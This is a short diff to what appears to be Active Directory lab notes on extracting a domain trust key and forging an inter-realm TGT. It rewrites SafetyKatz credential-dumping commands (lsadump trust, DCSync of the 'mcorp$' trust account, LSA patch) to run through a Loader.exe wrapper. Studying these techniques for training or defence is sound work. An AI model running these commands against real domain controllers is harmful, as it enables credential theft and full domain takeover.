@@ -8,11 +8,11 @@ Ultimate goal is to extract **trust key** from `Child-DC` and forge a inter-real
 
 Extract trust key - '`mcorp$` is the trust account
 ```powershell
-SafetyKatz.exe "lsadump::evasive-trust /patch"
+.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
 
-SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"
+.\Loader.exe -path .\SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"
 
-SafetyKatz.exe "lsadump::lsa /patch"
+.\Loader.exe -path .\SafetyKatz.exe "lsadump::lsa /patch"
 ```
 
 Forge inter-realm TGT
